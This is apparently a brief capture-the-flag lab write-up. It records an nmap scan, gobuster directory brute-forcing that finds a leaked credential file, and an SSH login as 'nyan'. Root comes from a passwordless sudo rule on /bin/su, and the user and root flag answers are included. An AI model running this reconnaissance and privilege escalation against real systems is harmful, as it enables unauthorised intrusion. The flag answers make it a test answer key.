# Final Exam

## Notes
```
Nmap scan report for 10.10.52.103
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

gobuster dir -u http://10.10.52.103/ -w ../wordlist/directory-list-2.3-medium.txt
===============================================================
/secret               (Status: 301) [Size: 313] [--> http://10.10.52.103/secret/]
```

gobuster dir -u http://10.10.52.103/ -w ../wordlist/directory-list-2.3-medium.txt -x .txt
secret.txt

nyan:046385855FC9580393853D8E81F240B66FE9A7B8
nyan:nyan


## Questions
1. What is the user.txt
```
ssh using nyan:nyan
supernootnoot
```

2. What is the root.txt
```
>sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su

>sudo /bin/su
will give you root shell
>cat /root/root.txt

congratulations!!!!
```